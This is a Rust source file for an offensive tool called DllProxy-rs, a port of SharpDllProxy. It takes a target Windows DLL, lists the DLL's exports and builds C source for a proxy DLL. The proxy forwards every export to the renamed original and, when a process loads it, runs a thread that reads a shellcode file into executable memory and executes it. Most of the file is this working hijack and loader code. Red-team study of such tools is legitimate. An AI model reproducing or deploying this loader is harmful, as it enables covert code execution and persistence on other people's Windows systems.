// Copyright (c) 2022 Petruknisme
// 
// This software is released under the MIT License.
// https://opensource.org/licenses/MIT


extern crate clap;
extern crate colored;

use clap::Parser;
use colored::Colorize;
use handlebars::{no_escape, Handlebars};
use serde_json::json;
use indoc::indoc;
use std::fs;
use std::process;
use std::io::{self, Write};
use std::path::Path;
use pelite::{FileMap, Wrap, PeFile};
use rand::distributions::{Alphanumeric, DistString};


#[derive(Parser)]
#[clap(name = "DllProxy-rs")]
#[clap(author = "Petruknisme <me@petruknisme.com>")]
#[clap(version = "1.0")]
#[clap(about = "Rust Implementation of SharpDllProxy for DLL Proxying Technique ", long_about = None)]


struct Cli {
    /// Dll File Location to hijack
    #[clap(short, long)]
    dll: String,

	/// Shellcode file to insert in the hijacked dll
	#[clap(short, long)]
	payload: String,
}

fn main() {
	let cli = Cli::parse();
	let dll_loc = cli.dll;
	let payload_loc = cli.payload;
    let tmp_name = format!("{}{}", "tmp", (Alphanumeric.sample_string(&mut rand::thread_rng(), 4)));
    let dll_template = get_dll_template();
    let mut tmp_format = Handlebars::new();
    // tell the handlebars to not escaping string
    tmp_format.register_escape_fn(no_escape);

	if check_file_exist(&dll_loc){

        if !check_file_exist(&payload_loc) {
			println!("Shellcode File doesn't exist. Please enter the correct location");
			process::exit(1);
		}

        let file_noext = Path::new(&dll_loc).file_stem().unwrap().to_string_lossy();
        let file_name = Path::new(&dll_loc).file_name().unwrap().to_string_lossy();
        let in_dir = format!("input_{}", &file_noext);
        let out_dir = format!("output_{}", &file_noext);

        println!("{}{}", "[+] Creating input folder if not exist ", &in_dir.yellow());
        create_io_dir(&in_dir);
        println!("{}{}", "[+] Backup original DLL to input directory at ", &in_dir.yellow());
        copy_file(&dll_loc, &format!("{}/{}", &in_dir, &file_name));

        println!("{}{}", "[+] Creating output folder if not exist ", &out_dir.yellow());

        create_io_dir(&out_dir);

		// Load the desired file into memory
		let file_map = FileMap::open(&dll_loc).unwrap();

		println!("{}{}", "[+] Searching exports function from : ", &dll_loc.yellow());

		// Process the image file
        let mut _exports = Vec::new();

        let mut pragma: Vec<String> = Vec::new();
		match PeFile::from_bytes(&file_map) {
			Ok(Wrap::T32(file)) => _exports = dump_export32(file),
			Ok(Wrap::T64(file)) => _exports = dump_export64(file),
			Err(err) => abort(&format!("{}", err)),
		}
        let export_count = _exports.len();
        println!("[+] Redirecting {} function calls from {} to {}.dll", &export_count, file_name, tmp_name);
        for i in &_exports {
            pragma.push(format!("#pragma comment(linker, \"/export:{}={}.{}\")\n", i, tmp_name, i ));
        }

        let pragma_builders = pragma.join("");
        let templ = tmp_format.render_template(&dll_template, &json!({"PRAGMA": &pragma_builders, "PAYLOAD_PATH": payload_loc})).unwrap();
        let c_file = format!("{}/{}_pragma.c", &out_dir, &file_noext);
        println!("{}{}", "[+] Exporting DLL C source code to ", &c_file );


	}else{
		println!("DLL File doesn't exist. Please enter the correct location");
		process::exit(1);
	}
}

fn dump_export64(file: pelite::pe64::PeFile) -> Vec<String> {
	use pelite::pe64::Pe;

	let exports = file.exports().unwrap();

	let by = exports.by().unwrap();

	let mut export_list = Vec::new();
	for result in by.iter_names() {
		if let (Ok(name), Ok(_export)) = result {
			export_list.push(name.to_string());
		}
	}

    return export_list;
}

fn dump_export32(file: pelite::pe32::PeFile) -> Vec<String>{
	use pelite::pe32::Pe;
	
	let exports = file.exports().unwrap();

	let by = exports.by().unwrap();
    let mut export_list = Vec::new();
	for result in by.iter_names() {
		if let (Ok(name), Ok(_export)) = result {
			export_list.push(name.to_string());
		}
	}

    return export_list;
}

fn abort(message: &str) -> ! {
	{
		let stderr = io::stderr();
		let mut stderr = stderr.lock();
		let _ = stderr.write(b"dump: ");
		let _ = stderr.write(message.as_bytes());
		let _ = stderr.write(b".\n");
		let _ = stderr.flush();
	}
	process::exit(1);
}

fn check_file_exist(path: &str) -> bool {

	return Path::new(path).exists();
}

fn create_io_dir(dirname: &String){
    match fs::create_dir_all(dirname){
        Err(e) => println!("{:?}", e),
        _ => ()
    }
}

fn copy_file(from: &String, to: &String){
    match fs::copy(from, to){
        Err(e) => println!("{:?}", e),
        _ => ()
    }
}

fn get_dll_template() -> String{
    let template =  indoc! { r###"
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)
{{PRAGMA}}
DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
FILE* fp;
    size_t size;
    unsigned char* buffer;
    fp = fopen("{{PAYLOAD_PATH}}", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);

    //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
fread(buffer, size, 1, fp);
    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, size);
    ((void(*) ())exec)();
    return 0;
}
BOOL APIENTRY DllMain(HMODULE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved
)
{
    HANDLE threadHandle;
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        // https://gist.github.com/securitytube/c956348435cc90b8e1f7
        // Create a thread and close the handle as we do not want to use it to wait for it
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);
        case DLL_THREAD_ATTACH:
        break;
        case DLL_THREAD_DETACH:
        break;
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
    "###};
    return template.to_string();
}

/*
fn check_buildtool_exist(){
	// cmd.exe /C '"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" && cl.exe'
}*/